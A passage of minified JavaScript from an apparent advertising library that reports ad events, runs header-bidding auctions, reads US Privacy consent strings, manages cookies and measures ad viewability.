    }, this.addChannelToMap = function (t, e) {
      t && e && (this.definition.channelMap || (this.definition.channelMap = {}), this.definition.channelMap[t] = e);
    };
  };
}, function (t, e) {
  AdTrack.Report = AdTrack.Report || {}, AdTrack.Report.PlacementReport = function (t, e, i, r, n, s, a) {
    var o = AdTrack.Utils.time(),
      d = AdTrack.Config.eventsEnabled(),
      c = function (a, c, h, l, u) {
        if (!1 !== d) {
          var p = {
              rt: u,
              t: AdTrack.Utils.time() - o,
              e: h,
              c: c ? c.tag : null,
              cf: c ? c.flag : null,
              v: l
            },
            f = [e, i, r, n].join("/");
          t.addEvent(s, f, p);
        }
      },
      h = {
        reportClick: function (t, e, i, r, n, s, a, o) {
          c(0, e, "click", {
            x: i || null,
            y: r || null,
            i: n || null,
            z: s || null,
            s: a ? a.name : null,
            key: o
          });
        },
        doClick: function (t, e, i, r, n, s, a, o, d) {
          if (c(0, e, "click", {
            x: i,
            y: r,
            i: n,
            z: s,
            s: o ? o.name : null,
            key: d
          }), t.options.newwindow) ;else if (null !== a) try {
            window.top.history.pushState && (AdTrack.BrowserFlags.isFirefox || AdTrack.BrowserFlags.isOldOpera) ? (window.top.history.pushState({}, document.title, window.top.location.href), window.top.location.assign(a)) : window.top.location.assign(a);
          } catch (t) {
            window.top.location.href = a;
          }
        },
        doPreload: function (t, e, i, r) {
          c(0, t, "preload", {
            s: e ? 1 : 0,
            to: i ? 1 : 0,
            t: r || 0
          });
        },
        doLoad: function (t, e, i, r, n, s, a, o, d, h) {
          d = d ? 1 : 0, h = h ? 1 : 0;
          var l = {
            c: i,
            s: r ? r.name : null,
            key: n,
            w: s,
            h: a,
            uib: o,
            bhb: d,
            bnhb: h
          };
          e.keyPostfix && (l.kp = e.keyPostfix), c(0, e, "load", l);
        },
        doPassback: function (t, e, i, r) {
          var n = {};
          i && (n.r = i, n.c = r ? 1 : 0), c(0, e, "passback", n);
        },
        doBidTimeout: function (t, e, i) {
          c(0, e, "bid_timeout", {
            debug: i ? 1 : 0
          });
        },
        doBidError: function (t, e, i) {
          c(0, e, "bid_error", {
            debug: i ? 1 : 0
          });
        },
        doBidTime: function (t, e, i, r) {
          c(0, e, "bid_time", {
            failed: r ? 1 : 0
          }, i);
        },
        doTimeout: function (t, e) {
          c(0, e, "timeout", null);
        },
        doBidResponse: function (t, e, i, r, n, s, a, o) {
          var d = {
            w: r,
            f: s = s || 0,
            c: a = a || 1,
            l: AdTrack.Utils.getLanguage(),
            uib: o
          };
          i && (d.p = i), e.keyPostfix && (d.kp = e.keyPostfix), c(0, e, "bid_response", d, n);
        },
        doBidRequest: function (t, e, i, r) {
          var n = {
            c: i,
            l: AdTrack.Utils.getLanguage(),
            uib: r
          };
          e.keyPostfix && (n.kp = e.keyPostfix), c(0, e, "bid_request", n);
        },
        doFilteredRequest: function (t, e) {
          c(0, e, "filtered_request", null);
        },
        doBidConsent: function (t, e, i, r) {
          c(0, e, "bid_consent", {
            gdpr: !!i,
            usp: !!r
          });
        },
        doClickConfirm: function (t, e) {
          c(0, e, "click_confirm", null);
        },
        doImpress: function (t, e, i, r, n) {
          c(0, e, "impress", {
            coeff: r,
            s: i ? i.name : null,
            key: n
          });
        },
        doAdRequest: function (t, e) {
          var i = null;
          void 0 !== t && (i = {
            r: t ? 1 : 0,
            f: e ? 1 : 0
          }), c(0, null, "adrequest", i);
        },
        doAdStart: function (t) {
          c(0, null, "adstart", {
            id: t
          });
        },
        doDisplayRequest: function () {
          c(0, null, "display_request", null);
        },
        doOverlap: function (t, e) {
          c(0, null, "overlap", {
            t: t = t || 0,
            a: e = e || 0
          });
        },
        doOverlapTime: function (t, e) {
          c(0, null, "overlap_time", {
            to: t,
            tv: e
          });
        },
        doUnfilledImp: function (t) {
          c(0, null, "unfilled", {
            reason: t
          });
        },
        doClose: function (t) {
          c(0, null, "close", {
            ct: t
          });
        },
        doPlacementPassback: function () {
          c(0, null, "pl_passback", null);
        },
        doPageView: function (t) {
          var e = {};
          if (t) {
            var i = AdTrack.Utils.screenDiagonal(screen.width, screen.height),
              r = navigator.userAgent;
            e = {
              ua: r = (r = r.replace(/"/g, "&quot;")).replace(/\\/g, "&bsol;"),
              s: i
            };
          }
          var n = AdTrack.Utils.windowTopAccess(),
            s = {
              sw: screen.width,
              sh: screen.height,
              vw: n ? AdTrack.Utils.getViewportRealWidth(n) : 0,
              vh: n ? AdTrack.Utils.getViewportRealHeight(n) : 0
            };
          e.sc = s, e.dpi = AdTrack.Utils.getDPI(), e.m = AdTrack.Utils.isMobile(), e.l = AdTrack.Utils.getLanguage(), c(0, null, "pageview", e);
        },
        doKeywords: function (t) {
          c(0, null, "keywords", t);
        },
        doViewability: function (t) {
          c(0, null, "viewability", {
            t: t
          });
        },
        doPbjCall: function (t, e) {
          c(0, null, "pbjCall", {
            pbu: e ? 1 : 0
          }, t);
        },
        doPbjAdUnits: function (t, e, i) {
          c(0, null, "pbjAdUnits", {
            u: t ? 1 : 0,
            f: e ? 1 : 0
          }, i);
        },
        doPbjInAuction: function (t) {
          c(0, null, "pbjInAuction", {
            au: t
          });
        },
        doPbjBidRequest: function (t, e, i, r, n, s, a, o) {
          var d = "pbjBidRequest";
          i && !0 === i && (d += "Debug");
          var h = {
            au: t
          };
          i && void 0 !== o && (h = {
            f: r,
            r: n,
            rf: s,
            rr: a,
            rft: o
          }), c(0, null, d, h, e);
        },
        doPbjTimeout: function (t, e, i) {
          var r = "pbjTimeout";
          i && !0 === i && (r += "Debug"), c(0, null, r, {
            au: t
          }, e);
        },
        doPbjBidDone: function (t, e) {
          c(0, null, "pbjBidDone", {
            au: t
          }, e);
        },
        doPbjNoBid: function (t, e, i) {
          var r = "pbjNoBid";
          i && !0 === i && (r += "Debug"), c(0, null, r, {
            au: t
          }, e);
        },
        doPbjBid: function (t, e, i, r, n, s) {
          c(0, i, "pbjBid", {
            au: t,
            p: r,
            c: n,
            rest: s
          }, e);
        },
        doPbjWin: function (t, e, i, r, n) {
          c(0, i, "pbjWin", {
            au: t,
            p: r,
            c: n
          }, e);
        },
        doPbjLoad: function (t, e, i, r, n) {
          c(0, i, "pbjLoad", {
            au: t,
            p: r,
            c: n
          }, e);
        },
        doProfiling: function (t, e) {
          c(0, null, "profiling", t, e);
        },
        doNTHBAuction: function (t, e, i, r, n, s) {
          c(0, null, "nthbAuction", {
            id: n = n || null,
            tid: s = s || null,
            t: t,
            s: e ? 1 : 0,
            c: i,
            p: r
          });
        },
        doNTHBDisplay: function (t, e, i, r, n) {
          c(0, null, "nthbDisplay", {
            id: r = r || null,
            tid: n = n || null,
            t: t,
            o: e,
            p: i
          });
        }
      };
    return h;
  };
}, function (t, e) {
  AdTrack.Report = AdTrack.Report || {}, AdTrack.Report.PrebidReport = function (t, e, i) {
    var r = AdTrack.Config.eventsEnabled(),
      n = AdTrack.Utils.time(),
      s = function (s, a, o) {
        if (i) {
          if (!1 === r) return;
          var d = {
            t: AdTrack.Utils.time() - n,
            rt: o,
            e: s,
            v: a
          };
          t.addEvent(e, "prebid", d, {
            hbDomain: i
          });
        }
      },
      a = {
        prebidInAuction: function (t, e) {
          s("inAuction", {
            au: t,
            b: e
          });
        },
        prebidBidRequest: function (t, e, i) {
          s("bidRequest", {
            au: t,
            b: e
          }, i);
        },
        prebidBidTimeout: function (t, e, i) {
          s("bidTimeout", {
            au: t,
            b: e
          }, i);
        },
        prebidBid: function (t, e, i, r, n, a) {
          s("bid", {
            au: t,
            b: e,
            p: r,
            c: n,
            rest: a
          }, i);
        },
        prebidWin: function (t, e, i, r, n) {
          s("win", {
            au: t,
            b: e,
            p: r,
            c: n
          }, i);
        },
        prebidLoad: function (t, e, i, r, n) {
          s("load", {
            au: t,
            b: e,
            p: r,
            c: n
          }, i);
        }
      };
    return a;
  };
}, function (t, e) {
  var i, r;
  AdTrack.EventStore = AdTrack.EventStore || (i = AdTrack.Config.eventsFlushInterval(), r = function (t) {
    var e = {},
      r = {},
      n = 0,
      s = function () {
        return !(n > 0);
      },
      a = function () {
        var t = e;
        return e = {}, n = 0, t;
      },
      o = function () {
        t(a(), r), r = {};
      };
    AdTrack.Timer.create(i, function () {
      s() || o();
    }).start();
    var d = "onpagehide" in window ? "pagehide" : "unload";
    return AdTrack.Utils.addEvent(window, d, function () {
      s() || o();
    }.bind(this)), {
      addEvent: function (t, i, s) {
        if ("string" == typeof t) {
          if (e[t] || (e[t] = []), e[t].push(i), n++, s) for (var a in s) s.hasOwnProperty(a) && (r[a] = s[a]);
          !i || "click" !== i.e && "unfilled" !== i.e && "close" !== i.e || o();
        }
      },
      flushStore: a,
      isEmpty: s
    };
  }, {
    create: function (t) {
      return new r(t);
    }
  }), AdTrack.XhrReport = AdTrack.XhrReport || function () {
    var t = {},
      e = AdTrack.Config.eventsEnabled(),
      i = {},
      r = function (e) {
        t[e] || (t[e] = AdTrack.EventStore.create(function (t, i) {
          !function (t, e, i) {
            var r = "//" + t + "/events.php?" + AdTrack.Utils.uri("u", AdTrack.url);
            for (var n in i) if (i.hasOwnProperty(n)) {
              var s = i[n];
              s && (r += "&" + AdTrack.Utils.uri(n, s));
            }
            var a = new XMLHttpRequest();
            a.open("POST", r, !0), a.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
            var o = AdTrack.JSON.stringify(e);
            o = o.replace(/&/g, "%26"), a.send("events=" + o), a.addEventListener("load", function (t) {});
          }(e, t, i);
        }));
      },
      n = function (i) {
        var n = AdTrack.Utils.time();
        r(i);
        var s = function (r, s, a) {
            if (!1 !== e) {
              var o = {
                t: AdTrack.Utils.time() - n,
                e: s,
                v: a
              };
              t[i].addEvent(r, o);
            }
          },
          a = {
            cmpTimeout: function (t) {
              s("cmp", "timeout", {
                cmp: t ? 1 : 0
              });
            },
            cmpSuccess: function (t, e, i) {
              s("cmp", "success", {
                to: e ? 1 : 0,
                source: t,
                v: i
              });
            },
            uspSuccess: function (t, e, i) {
              s("usp", "success", {
                to: e ? 1 : 0,
                source: t,
                v: i
              });
            },
            userIdFetch: function (t, e, i) {
              s("userid", "fetch", {
                s: t || "",
                cr: e = e ? 1 : 0,
                ct: i = i || 0
              });
            },
            userIdLoad: function (t, e, i) {
              s("userid", "load", {
                rt: t,
                ci: e,
                ri: i
              });
            },
            userIdFinal: function (t, e, i) {
              s("userid", "final", {
                d: t = t ? 1 : 0,
                l: e = e || 0,
                tl: i = i || 0
              });
            }
          };
        return a;
      },
      s = {
        getPlacementReport: function (t, e, n, s, a, o) {
          if ("string" != typeof a || "string" != typeof t || "string" != typeof e || "string" != typeof n || "string" != typeof s) return {};
          if ("function" != typeof AdTrack.Report.PlacementReport) return {};
          var d = [t, e, n, s].join("_");
          return i[d] || (r(a), i[d] = AdTrack.Report.PlacementReport(this, t, e, n, s, a, o)), i[d];
        },
        getGenericReport: function (t) {
          return "string" != typeof t ? {} : new n(t);
        },
        getPrebidReport: function (t, e) {
          return "string" != typeof t ? {} : "function" != typeof AdTrack.Report.PrebidReport ? {} : (r(t), AdTrack.Report.PrebidReport(this, t, e));
        },
        addEvent: function (e, i, r, n) {
          t[e].addEvent(i, r, n);
        }
      };
    return s;
  }();
}, function (t, e) {
  var i, r;
  AdTrack.Price = (i = {
    USD: 22.203,
    EUR: 25.89,
    CZK: 1
  }, r = function (t, e, r, n) {
    t = isNaN(t) ? -1 : t, this.originalPrice = t, this.currency = e, this.dealId = r || null, this.isDealFlag = !!r, this.noFP = n, this.price = t, this.factor = null, this.getCurrency = function () {
      return this.currency;
    }, this.getOriginalPrice = function () {
      return this.originalPrice;
    }, this.getPrice = function (t) {
      return t ? parseFloat(this.price / function (t) {
        return i[t] || 1;
      }(t)).toFixed(10) : this.price;
    }, this.getFactor = function () {
      return this.factor;
    }, this.setFactor = function (t) {
      this.factor || isNaN(t) || (this.factor = t > 0 ? t : 1, this.price = this.price * this.factor);
    }, this.getDealId = function () {
      return this.dealId;
    }, this.isDeal = function () {
      return this.isDealFlag;
    };
  }, {
    USD: "USD",
    EUR: "EUR",
    CZK: "CZK",
    create: function (t, e, i, n) {
      return new r(t, e, i, n);
    },
    setCurrencySettings: function (t) {
      if (t) for (var e in i) i.hasOwnProperty(e) && t.hasOwnProperty(e) && !isNaN(parseFloat(t[e])) && (i[e] = parseFloat(t[e]));
    }
  });
}, function (t, e) {
  !function () {
    var t = window;
    try {
      window.top.AdTrack = window.top.AdTrack || {}, t = window.top;
    } catch (t) {}
    var e = function () {
      var t = null,
        e = !1,
        i = AdTrack.XhrReport.getGenericReport(AdTrack.Config.getReportingUrl()),
        r = function (t) {
          i.uspSuccess(t, e, 1);
        },
        n = function (t, e, i, r) {
          var n,
            s = !1;
          r && r > 0 && (n = setTimeout(function () {
            s = !0, i("Timed out");
          }, r));
          t("getUSPData", 1, function (t, r) {
            if (!s) {
              clearTimeout(n);
              var a = null;
              r && t ? (a = {
                uspPolicyVersion: t.version,
                consentString: t.uspString
              }, d(a) ? e(a) : i("Invalid data from api")) : i("Api command failed");
            }
          });
        },
        s = function () {
          var t;
          try {
            t = window.__uspapi || window.top.__uspapi;
          } catch (t) {}
          if ("function" == typeof t) return t;
          if (window !== window.parent) {
            var e = function () {
              for (var t = window, e = null; !e;) {
                try {
                  t.frames.__uspapiLocator && (e = t);
                } catch (t) {}
                if (t === window.top) break;
                t = t.parent;
              }
              return e;
            }();
            if (e) return function (t) {
              var e = {};
              return window.__uspapi = function (i, r, n, s) {
                var a = Math.random() + "",
                  o = {
                    __uspapiCall: {
                      command: i,
                      parameter: s,
                      version: r,
                      callId: a
                    }
                  };
                e[a] = n, t.postMessage(o, "*");
              }, window.addEventListener("message", function (t) {
                let i = {};
                try {
                  i = "string" == typeof t.data ? JSON.parse(t.data) : t.data;
                } catch (t) {}
                const r = i.__uspapiReturn;
                r && "function" == typeof e[r.callId] && (e[r.callId](r.returnValue, r.success), delete e[r.callId]);
              }, !1), window.__uspapi;
            }(e);
            h("USP not found");
          }
        },
        a = function (t, e, i, r) {
          var n = s();
          if (n) t(n);else {
            var a = function (t, e) {
              var i = !1,
                r = null,
                n = null,
                s = null,
                a = function () {
                  clearInterval(r), clearTimeout(n), i = !1;
                },
                o = {
                  start: function (o, d, c) {
                    i || (i = !0, r = setInterval(function () {
                      (s = o()) && (a(), d());
                    }, t), e && e > 0 && (n = setTimeout(function () {
                      a(), "function" == typeof c && c();
                    }, e)));
                  },
                  stop: function () {
                    a();
                  },
                  getTarget: function () {
                    return s;
                  }
                };
              return o;
            }(i, r);
            a.start(s, function () {
              n = a.getTarget(), t(n);
            }, e);
          }
        },
        o = function (e, i) {
          t = e, "iab" === i && AdTrack.Utils.setLocalStorageItem("AT-usprivacy", JSON.stringify(t));
        },
        d = function (t) {
          if (!t) return !1;
          var e = t.consentString;
          return "string" == typeof e && e.length;
        },
        c = function () {
          return d(t);
        },
        h = function (t) {},
        l = {
          getConsentData: function () {
            return t;
          },
          fn: function () {}
        };
      return function () {
        if (!c()) {
          var t = function () {
            var t = AdTrack.Utils.getLocalStorageItem("AT-usprivacy"),
              e = AdTrack.Utils.readCookie("usprivacy"),
              i = null;
            try {
              i = JSON.parse(t);
            } catch (t) {}
            return t && i ? {
              uspPolicyVersion: i.uspPolicyVersion,
              consentString: i.consentString
            } : e ? {
              uspPolicyVersion: 1,
              consentString: e
            } : void 0;
          }();
          if (t && (d(t) ? (o(t, "cookie"), r("cookie")) : h("Invalid data in cache")), c()) {
            a(function (t) {
              n(t, function (t) {
                o(t, "iab");
              }, function () {}, 0);
            }, function () {}, 1e3);
          } else {
            var i = setTimeout(function () {
              c() || (e = !0), clearTimeout(i);
            }, 1e3);
            a(function (t) {
              n(t, function (t) {
                r("iab"), o(t, "iab");
              }, function (t) {
                h("Error while requesting api: " + t);
              }, 0);
            }, function () {}, 300, 1e4);
          }
        }
      }(), l;
    };
    if (t.AdTrack.USP && "function" == typeof t.AdTrack.USP.fn) try {
      t.AdTrack.USP.fn();
    } catch (i) {
      t.AdTrack.USP = e();
    } else t.AdTrack.USP = e();
    window.AdTrack.USP = t.AdTrack.USP;
  }();
}, function (t, e) {
  AdTrack.Auction = function (t, e, i, r, n, s, a, o, d) {
    this.isNTHB = !!i, this.minFP = r || 0, this.placementId = n, this.hbChannels = t, this.channels = e, this.events = s, this.debug = a, this.doError = o, d || (d = "dispatcher"), this.source = d;
  }, AdTrack.Auction.prototype = {
    getWinnerBidIndex: function (t, e) {
      for (var i = -1, r = -1, n = !1, s = 0; s < this.hbChannels.length; s++) {
        var a = this.hbChannels[s];
        if (a) {
          var o = null,
            d = 0,
            c = !1,
            h = !1,
            l = "",
            u = null;
          a.price && (h = a.price.isDeal(), c = a.price.noFP, a.price.setFactor(h ? this.channels[s].factorFixed : this.channels[s].factor), o = a.price.getPrice(), d = a.price.getOriginalPrice(), l = a.price.getCurrency(), u = a.price.getFactor(), "DID-811-92131" === a.price.getDealId() && this.doError("Deal ID (DID-811-92131) received from " + a.chd.tag + "#" + a.chd.flag + " has auction price  " + o + " " + l + " due factor " + u, "debug"));
          var p = this.channels[s].sfc || 1,
            f = this.channels[s].floor * p;
          try {
            null !== o && AdTrack.Utils.isPremiumAdform(a.chd) && o < .99 * f && !h && !c && this.doError("[" + this.source + "] Premium bid under FP");
          } catch (t) {}
          if (this.isNTHB && (f = this.minFP), a.chd.dealPriority && h && (!n || n && o > i)) {
            i = o, r = s, n = !0;
            continue;
          }
          if (!n && null !== o && (o >= f || h || c) && o > i) i = o, r = s;else {
            var g = "Channel (" + a.chd.tag + "#" + a.chd.flag + ")  with price " + o + " CZK, factor " + u + ",  (=" + d + " " + l + "), isDeal:" + h + " has been excluded from auction due: ";
            if (n && !a.chd.dealPriority) g += "Deal was prioritized.";else if (null === o) g = null;else if (o < f && !h) g += "Price " + o + " CZK is under the floor price which is " + f + " CZK";else if (o <= i && null !== i) if (this.hbChannels[r] && this.hbChannels[r].price) {
              var m = this.hbChannels[r];
              g += "There is already higher bidder " + m.chd.tag + "#" + m.chd.flag + " with price " + i + " CZK, factor " + m.price.getFactor() + " (=" + m.price.getOriginalPrice() + " " + m.price.getCurrency() + ")";
            } else g += "winner bidder has undefined price";
            g && "r2b2" === a.chd.tag && this.placementId && -1 !== this.placementId.getName().search("ulozto.cz") && this.doError(g, "debug");
          }
        }
      }
      return r;
    }
  };
}, function (t, e) {
  var i, r;
  AdTrack.DOM = AdTrack.DOM || function () {
    var t = [];
    function e() {}
    return e.getIframeDocument = function (t) {
      var e = null;
      try {
        e = t.contentDocument || t.contentWindow.document;
      } catch (t) {}
      return e;
    }, e.getAllIframes = function (i, r, n) {
      n = (n = void 0 === n || "number" != typeof n ? 5 : n) <= 0 ? 1 : n;
      var s = function (e) {
          var i = 0,
            s = setInterval(function () {
              if (i === n) {
                var o = t;
                return t = [], clearInterval(s), r(o), void a(o);
              }
              for (var d = e.getElementsByTagName("iframe"), c = 0; c < d.length; c++) -1 === t.indexOf(d[c]) && t.push(d[c]);
              i++;
            }, 200);
        },
        a = function (t) {
          for (var i = 0; i < t.length; i++) {
            var r = e.getIframeDocument(t[i]);
            r && s(r);
          }
        };
      i && s(i);
    }, e;
  }(), AdTrack.DOM.Visibility = AdTrack.DOM.Visibility || function () {
    var t = {},
      e = {},
      i = 0,
      r = function (t, e) {
        var r = ++i;
        return "function" == typeof e ? (t[r] = e, r) : 0;
      },
      n = function () {
        return document.hidden || "hidden" === document.visibilityState ? "hidden" : "visible";
      },
      s = n(),
      a = function (i) {
        var r,
          a,
          o = i || n();
        if (a = (r = o) !== s, s = r, a) {
          var d = "hidden" === s ? t : e;
          Object.keys(d).forEach(function (t) {
            d[t]();
          });
        }
      },
      o = AdTrack.Utils.windowTopAccess() ? window.top.document : null;
    o && (AdTrack.Utils.addEvent(o, "visibilitychange", function () {
      a();
    }), AdTrack.Utils.addEvent(o, "pagehide", function () {
      a("hidden");
    }), AdTrack.Utils.addEvent(o, "pageshow", function () {
      a("visible");
    }));
    var d = {
      onHidden: function (e) {
        return r(t, e);
      },
      onVisible: function (t) {
        return r(e, t);
      }
    };
    return d.removeCallback = function (i) {
      !function (i) {
        i && (delete t[i], delete e[i]);
      }(i);
    }, d.isHidden = function () {
      return "hidden" === s;
    }, d;
  }(), AdTrack.DOM.Transforms = (i = function (t) {
    var e = [];
    this.revert = function () {
      for (; e.length > 0;) {
        var t = e.pop();
        if ("function" == typeof t) try {
          t();
        } catch (t) {}
      }
    }, this.addCSS = function (e) {
      var i = t.createElement("style");
      try {
        i.innerHTML = e;
      } catch (t) {
        i.styleSheet.cssText = e;
      }
      this.addElement(t.getElementsByTagName("head")[0], i);
    }, this.styleElement = function (t, i, r, n) {
      var s = t.style.getPropertyValue(i),
        a = t.style.getPropertyPriority(i);
      void 0 !== n ? t.style.setProperty(i, r, n) : t.style.setProperty(i, r), e.push(function () {
        void 0 !== a ? t.style.setProperty(i, s, a) : t.style.setProperty(i, r);
      });
    }, this.addElement = function (t, i, r) {
      r ? t.insertBefore(i, r) : t.appendChild(i), e.push(function () {
        try {
          t.removeChild(i);
        } catch (t) {}
      });
    }, this.customTransform = function (t) {
      "function" == typeof t && e.push(t);
    }, this.removeElement = function (i, r) {
      var n = t.createElement("div");
      n.setAttribute("style", "display: none !important;"), i.insertBefore(n, r), i.removeChild(r), e.push(function () {
        try {
          i.insertBefore(r, n), i.removeChild(n);
        } catch (t) {}
      });
    };
  }, {
    getTransforms: function (t) {
      return new i(t);
    }
  }), AdTrack.DOM.Component = (r = function (t) {
    var e = {},
      i = {},
      r = function (t, r) {
        t.id = e[r].substr(1), i[r] = t;
      },
      n = function (t) {
        e[t] = "#" + AdTrack.Utils.simpleStringGenerator(10, "c");
      };
    n("wrap"), n("element"), n("transformLayer");
    var s = t.document.createElement("div"),
      a = t.document.createElement("div");
    return s.appendChild(a), r(s, "wrap"), r(a, "transformLayer"), {
      getMacros: function () {
        return e;
      },
      getWrap: function () {
        return i.wrap;
      },
      getElement: function () {
        return i.element;
      },
      getTransformLayer: function () {
        return i.transformLayer;
      },
      setElement: function (t) {
        i.element || (r(t, "element"), i.transformLayer.appendChild(t));
      },
      destroy: function () {
        var t = i.wrap;
        t.parentNode && t.parentNode.removeChild(t), i.wrap = null;
      }
    };
  }, {
    register: function (t, e, i) {
      if (t && e) {
        var n = new r(i);
        return e.macros[t] = n.getMacros(), n;
      }
    }
  });
}, function (t, e) {
  var i, r, n;
  AdTrack.Cookies = AdTrack.Cookies || (i = {}, r = !1, n = "//" + AdTrack.Config.getServerURL() + "/cookie.php", i.getCookie = function (t, e) {
    if (r || !e) return AdTrack.Utils.readCookie(t);
    var i = n + "?" + AdTrack.Utils.uri("k", t),
      s = new XMLHttpRequest();
    return s.open("GET", i, !1), s.send(), 200 === s.status ? s.responseText : "";
  }, i.setCookie = function (t, e, i, s) {
    if (r || !s) {
      var a = new Date();
      a.setTime(a.getTime() + 1e3 * i);
      var o = "expires=" + a.toUTCString();
      document.cookie = t + "=" + e + "; " + o + ";domain=" + AdTrack.Utils.getDomainName(document.location.host) + "; Path=/";
    } else {
      var d = {
          k: t,
          v: e,
          x: i
        },
        c = new XMLHttpRequest();
      c.open("POST", n, !0), c.setRequestHeader("Content-Type", "application/x-www-form-urlencoded"), c.send("cookie=" + AdTrack.JSON.stringify(d));
    }
  }, i.addImp = function (t, e) {
    var r = i.getCookie("AdTrack-imp-" + t.d + "-" + t.type + "-" + t.g + "-" + t.p, !0);
    return r ? r++ : r = 1, i.setCookie("AdTrack-imp-" + t.d + "-" + t.type + "-" + t.g + "-" + t.p, r, e, !0), r;
  }, i.setHide = function (t, e) {
    i.setCookie("AdTrack-hide-" + t.d + "-" + t.type + "-" + t.g + "-" + t.p, 1, e, !0);
  }, i.isHidden = function (t, e) {
    var r = "AdTrack-hide-" + t.d + "-" + t.type + "-" + t.g + "-" + t.p;
    return e && e.options ? !!e.options.hideDelay && i.getCookie(r) : i.getCookie(r);
  }, i.setCookie("AdTrack-cookies", 1, 1), r = !!i.getCookie("AdTrack-cookies"), i.cookiesEnabled = r, i);
}, function (t, e) {
  AdTrack.Viewability = AdTrack.Viewability || {
    DEFAULT_THRESHOLD: .7,
    isInView: function (t) {
      try {
        var e = AdTrack.Utils.getCrossFrameRect(t);
        if (!e || !AdTrack.Utils.windowTopAccess()) return !0;
        var i = AdTrack.Utils.getViewportRealWidth(window.top),
          r = AdTrack.Utils.getViewportRealHeight(window.top);
        return e.top < r && e.bottom > 0 && e.left < i && e.right > 0;
      } catch (t) {
        return !0;
      }
    },
    getVisiblePercentage: function (t) {
      try {
        var e = AdTrack.Utils.getCrossFrameRect(t),
          i = t.ownerDocument,
          r = AdTrack.Utils.windowTopAccess() || i.defaultView || i.parentWindow;
        if (!e || !r) return 0;
      } catch (t) {
        return 0;
      }
      var n = e.right - e.left,
        s = e.bottom - e.top,
        a = AdTrack.Utils.getViewportRealWidth(r),
        o = AdTrack.Utils.getViewportRealHeight(r),
        d = Math.max(0, Math.min(e.right, a) - Math.max(e.left, 0)),
        c = Math.max(0, Math.min(e.bottom, o) - Math.max(e.top, 0));
      return n * s == 0 ? 0 : d * c / (n * s);
    },
    getBasicCallback: function (t) {
      return function (e) {
        t.viewabilityChanged(e);
      };
    }
  };
}, function (t, e) {
  AdTrack.Viewability.Handler = AdTrack.Viewability.Handler || function (t) {
    var e = t || AdTrack.Viewability.DEFAULT_THRESHOLD,
      i = 0,
      r = 0,
      n = [],
      s = null,
      a = function (t) {
        return isNaN(t) ? 0 : parseInt(t);
      };
    s = AdTrack.Timer.create(500, function (t) {
      i = t, function () {
        for (var t = n.length - 1; t >= 0; t--) {
          var e = n[t];
          e.time <= i && !e.removed && (e.interval > 0 ? e.end <= i ? (e.removed = !0, n.splice(t, 1)[0].callback(r, i)) : (e.time += e.interval, e.callback(r, i)) : (e.removed = !0, n.splice(t, 1)[0].callback(r, i)));
        }
      }();
    });
    var o = {
      addCallback: function (t, e, i, r) {
        e = a(e), i = a(i), r = a(r), "function" == typeof t && n.push({
          time: e,
          callback: t,
          removed: !1,
          interval: i,
          end: r
        });
      },
      getViewabilityTime: function () {
        return i;
      },
      viewabilityChanged: function (t) {
        r = t, s && (r >= e ? s.start() : s.stop());
      },
      dispose: function () {
        s && (s.stop(), s = null);
      }
    };
    return o;
  };
}, function (t, e) {
  AdTrack.Viewability.Probe = AdTrack.Viewability.Probe || function (t, e, i, r) {
    var n = {},
      s = t,
      a = AdTrack.Utils.windowTopAccess(),
      o = 0,
      d = function () {
        var t = e();
        !t && 0 !== t || t === o || i(o = t);
      };
    setTimeout(d, 1);
    var c = AdTrack.Utils.debounce(d, r || 100);
    return "function" == typeof e && "function" == typeof i && (AdTrack.Utils.addEvent(s, "resize", c), AdTrack.Utils.addEvent(s, "scroll", c), AdTrack.Utils.addEvent(s, "adt-action", c), a && (AdTrack.Utils.addEvent(a, "resize", c), AdTrack.Utils.addEvent(a, "scroll", c))), n.getVisiblePercentage = function () {
      return o;
    }, n.getWindow = function () {
      return s;
    }, n.dispose = function () {
      AdTrack.Utils.removeEvent(s, "resize", c), AdTrack.Utils.removeEvent(s, "scroll", c), AdTrack.Utils.removeEvent(s, "adt-action", c), a && (AdTrack.Utils.removeEvent(a, "resize", c), AdTrack.Utils.removeEvent(a, "scroll", c)), i && i(0);
    }, n;
  };
}, function (t, e) {
  AdTrack.Metrics = function (t, e, i) {
    var r,
      n = t.getName(),
      s = (i.publisher && i.publisher.tag, {
        startProfiling: function () {
          r = AdTrack.Profiling(t, e, i);
        },
        evViewability: function (i, r) {
          var s = "flexi" === r && !t.isPosition("outstream") && !t.isPosition("video") && !t.isPosition("branding");
          ("classic_im.zkouknito.cz_generic_fixed" === n || "classic_im.fdb.cz_generic_fixed" === n || "mobile_im.zkouknito.cz_autorefresh_fixed" === n || "mobile_im.fdb.cz_autorefresh_fixed" === n || "classic_tn.cz_generic_fixed" === n || "classic_novaplus.cz_generic_fixed" === n || "classic_followmanga.com_generic_fixed" === n || "classic_jappy.com_generic_fixed" === n || "mobile_r2b2.motherclub.cz_generic_vignette" === n || "mobile_r2b2.motherclub.cz_autorefresh_vignette" === n || "classic_thiraithee.net_generic_vignette" === n || "classic_thiraithee.net_autorefresh_vignette" === n || "mobile_luftika.rs_generic_vignette" === n || "mobile_luftika.rs_autorefresh_vignette" === n || "classic_bestpap.com_generic_sticky" === n || "classic_bestpap.com_autorefresh_sticky" === n || "classic_newsonground.com_generic_sticky" === n || "classic_newsonground.com_autorefresh_sticky" === n || "classic_techcurved.com_generic_sticky" === n || "classic_techcurved.com_autorefresh_sticky" === n || s || "interscroll" === r) && "function" == typeof e.doViewability && e.doViewability(i);
        },
        evClose: function (t) {
          (!t || t < 0) && (t = 0), "function" == typeof e.doClose && e.doClose(t);
        },
        evOverlap: function (t, i) {
          "function" == typeof e.doOverlap && e.doOverlap(t, i);
        },
        evOverlapTime: function (t, i) {
          "function" == typeof e.doOverlapTime && e.doOverlapTime(t, i);
        },
        evUnfilledImp: function (t) {
          "function" == typeof e.doUnfilledImp && e.doUnfilledImp(t);
        },
        evProfiling: function (t, e) {
          r && r.breakpoint(t, e);
        }
      });
    return s;
  }, AdTrack.Metrics.metrics = {}, AdTrack.Metrics.initMetrics = function (t, e, i) {
    return AdTrack.Metrics.metrics[t] || (AdTrack.Metrics.metrics[t] = AdTrack.Metrics(t, e, i)), AdTrack.Metrics.metrics[t];
  }, AdTrack.Metrics.getMetrics = function (t) {
    return AdTrack.Metrics.metrics[t];
  };
}, function (t, e) {
  AdTrack.Profiling = function (t, e, i) {
    var r = AdTrack.Utils.time(),
      n = t.getName(),
      s = i.publisher && i.publisher.tag,
      a = {
        breakpoint: function (t, i) {
